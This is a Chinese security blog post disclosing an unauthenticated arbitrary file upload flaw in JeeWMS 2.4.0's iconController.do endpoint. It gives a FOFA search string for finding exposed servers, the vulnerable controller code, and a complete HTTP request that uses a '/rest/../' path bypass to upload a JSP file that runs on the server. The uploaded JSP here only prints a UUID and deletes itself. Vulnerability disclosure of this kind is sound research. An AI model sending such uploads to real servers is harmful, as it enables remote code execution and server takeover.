---
title: "JeeWMS iconController.do 任意文件上传漏洞"
source: https://mrxn.net/jswz/JeeWMS-iconController-upload-rce.html
asset_dir: assets/jeewms-iconcontroller.do-任意文件上传漏洞
---

# JeeWMS iconController.do 任意文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/3 09:30
- 1649浏览
- [0评论](#comment)
- 24分钟阅读

深入探索

web 服务器

rest

表现层状态转换

---

# 漏洞简介

JeeWMS 是基于Java全栈技术打造的智能仓储中枢系统，具备多形态仓储场景深度适配能力（兼容3PL第三方物流与厂内物流双模式）。JeeWMS iconController.do 接口存在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

漏洞修复方案

# 影响版本

2.4.0（2025-03-26 当前最新版）

# fofa语法

> `body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"`

# 漏洞分析

可以明显看到没有任何校验直接[上传文件](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，且文件保存在 `plug-in/accordion/images`目录下

```
/**
     * 上传图标
     * 
     * @param request
     * @return
     * @throws Exception
     */
    @RequestMapping(params = "saveOrUpdateIcon", method = RequestMethod.POST)
    @ResponseBody
    public AjaxJson saveOrUpdateIcon(HttpServletRequest request) throws Exception {
        String message = null;
        AjaxJson j = new AjaxJson();        
        TSIcon icon = new TSIcon();
        Short iconType = oConvertUtils.getShort(request.getParameter("iconType"));
        String iconName = oConvertUtils.getString(request.getParameter("iconName"));
        String id = request.getParameter("id");
        icon.setId(id);
        icon.setIconName(iconName);
        icon.setIconType(iconType);
        // uploadFile.setBasePath("images/accordion");
        UploadFile uploadFile = new UploadFile(request, icon);
        uploadFile.setCusPath("plug-in/accordion/images");
        uploadFile.setExtend("extend");
        uploadFile.setTitleField("iconclas");
        uploadFile.setRealPath("iconPath");
        uploadFile.setObject(icon);
        uploadFile.setByteField("iconContent");
        uploadFile.setRename(false);
        systemService.uploadFile(uploadFile);
        // 图标的css样式
        String css = "." + icon.getIconClas() + "{background:url('../images/" + icon.getIconClas() + "." + icon.getExtend() + "') no-repeat}";
        write(request, css);
        message = MutiLangUtil.paramAddSuccess("common.icon");
        j.setMsg(message);
        return j;
    }
```

深入探索

服务器安全服务

编码转换工具

在线安全工具

权限绕过部分 参考前一篇文章 [JeeWMS commonController.do 任意文件上传漏洞（CVE-2024-57761）](https://mrxn.net/jswz/JeeWMS-commonController-upload-rce.html)

计算机服务器

# 漏洞复现

```
POST /rest/../iconController.do?saveOrUpdateIcon HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=----123321

------123321
Content-Disposition: form-data; name="file"; filename="uid.jsp"
Content-Type: image/png

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------123321--
```

[![JeeWMS iconController.do 任意文件上传漏洞](images/img-001-2fcd6b1e294e.webp)](https://image.mrxn.net/9d0d2aeb4b13427588454836c4617a0b.webp)

访问文件 `/plug-in/accordion/images/uid.jsp`

[![JeeWMS iconController.do 任意文件上传漏洞](images/img-002-d5128ba1c0c6.webp)](https://image.mrxn.net/d243baa58ee74945b7cac4e8b2eaa052.webp)

成功打印 UUID 并删除自身。

网站托管与域名注册

> PS : 其实这个洞 和 Jeecg 的 iconController 上传一模一样 ...
>
> 漏洞修复方案

# 参考

- `https://gitee.com/erzhongxmu/JEEWMS`

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
